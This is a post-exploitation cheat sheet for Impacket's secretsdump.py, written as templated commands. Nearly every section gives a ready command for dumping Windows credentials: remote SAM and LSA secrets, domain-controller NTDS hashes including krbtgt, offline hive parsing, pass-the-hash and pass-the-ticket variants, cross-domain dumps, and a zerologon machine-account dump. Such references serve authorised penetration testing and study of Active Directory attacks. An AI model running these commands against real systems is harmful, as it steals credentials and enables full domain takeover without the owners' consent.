# secretsdump.py (imp)

% impacket-secrets, windows, smb, 445

#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 

## desc
```
Performs various techniques to dump secrets from the remote machine without executing any agent there. 

For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data from there. 

For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state.
```


## auth (creds)
```bash
secretsdump.py -debug <domain_fqdn>/<user>:'<password>'@<target_fqdn>
```

## auth (pth)
```bash
secretsdump.py -debug -hashes :<nt_hash> <domain_fqdn>/<user>@<target_fqdn>
```

## auth (ptt)
```bash
KRB5CCNAME=<ccache> secretsdump.py -debug -k -no-pass -dc-ip <dc_fqdn> -no-pass -k <domain_fqdn>/<user>@<target_fqdn>
```

## SAM & LSA  (creds)
```bash
secretsdump.py -debug -exec-method smbexec -outputfile <target_fqdn> <domain_fqdn>/<user>:'<password>'@<target_fqdn>
```

## SAM & LSA  (pth)
```bash
secretsdump.py -debug -exec-method smbexec -outputfile <target_fqdn> -hashes :<nt_hash> <domain_fqdn>/<user>@<target_fqdn> 
```

## SAM & LSA  (ptt)
```bash
KRB5CCNAME=<ccache> secretsdump.py -debug -exec-method smbexec -outputfile <target_fqdn> -dc-ip <dc_fqdn> -no-pass -k <domain_fqdn>/<user>@<target_fqdn>
```

## SAM (offline)
```bash
secretsdump.py -debug -outputfile <target_fqdn> -system <SYSTEM_FILE|system.save> -sam <SAM_FILE|sam.save> LOCAL
```

## LSA (offline)
```bash
secretsdump.py -debug -outputfile <target_fqdn> -system <SYSTEM_FILE|system.save> -security <SECURITY_FILE|security.save>' LOCAL
```

## NTDS - all (creds)
```bash
secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status  <domain_fqdn>/<user>:'<password>'@<dc_fqdn>
```

## NTDS - all (pth)
```bash
secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -hashes :<nt_hash> <domain_fqdn>/<user>@<dc_fqdn>
```

## NTDS - all (ptt)
```bash
KRB5CCNAME=<ccache> secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -no-pass -k <domain_fqdn>/<user>@<dc_fqdn>
```

## NTDS - all cross domain (ptt)
```bash
KRB5CCNAME=<ccache> secretsdump.py -debug -outputfile <dst_dc_fqdn> -just-dc -user-status -no-pass -k <dst_domain_fqdn>/<user>@<dst_dc_fqdn>
```



## NTDS - user (creds)
```bash
secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -just-dc-user <domain_fqdn>/<name|krbtgt> <domain_fqdn>/<user>:'<password>'@<dc_fqdn>
```

## NTDS - user (pth)
```bash
secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -just-dc-user <domain_fqdn>/<name|krbtgt> -hashes :<nt_hash> <domain_fqdn>/<user>@<dc_fqdn>
```

## NTDS - user (ptt)
```bash
KRB5CCNAME=<ccache> secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -just-dc-user <domain_fqdn>/<name|krbtgt> -no-pass -k <domain_fqdn>/<user>@<dc_fqdn>
```


## NTDS - user cross domain (ptt)
```bash
KRB5CCNAME=<ccache> secretsdump.py -debug -outputfile <dst_dc_fqdn> -just-dc -user-status -just-dc-user <dst_domain_fqdn>/<name|krbtgt> -no-pass -k <dst_domain_fqdn>/<user>@<dc_fqdn>
```

## NTDS - offline
```bash
secretsdump.py -debug -outputfile <dc_fqdn> -ntds <NTDS_FILE|ntds_file.dit> -system <SYSTEM_FILE|system.save> LOCAL 
```


## NTDS - zerologon 
zerologon
```bash
secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -no-pass <dc_name>\$@<dc_fqdn>
```